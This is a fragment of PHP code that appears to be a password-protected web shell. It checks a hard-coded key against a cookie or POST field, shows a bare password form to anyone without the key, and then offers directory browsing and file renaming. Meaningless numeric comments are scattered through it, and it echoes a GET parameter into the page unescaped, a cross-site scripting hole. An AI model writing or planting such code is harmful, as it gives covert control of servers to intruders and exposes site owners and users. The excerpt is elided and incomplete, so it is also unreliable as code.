...
$auth_key = "489edab0afa21aa239a976ebaa608f61";
...
$pass = false;
if (isset($_COOKIE['pw_name_12226'])) {
    if(($_COOKIE['pw_name_12226']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_12226'])) {
        if(($_POST['pw_name_12226']) == $auth_key) {
            setcookie("pw_name_12226", $_POST['pw_name_12226']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_12226' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682773375878 1724682773596652 1724682773594763 1724682773574419
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682773375878 1724682773596652 1724682773594763 1724682773574419
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682773375878 1724682773596652 1724682773594763 1724682773574419
            $name = PATH . "/" . $_GET['r'];
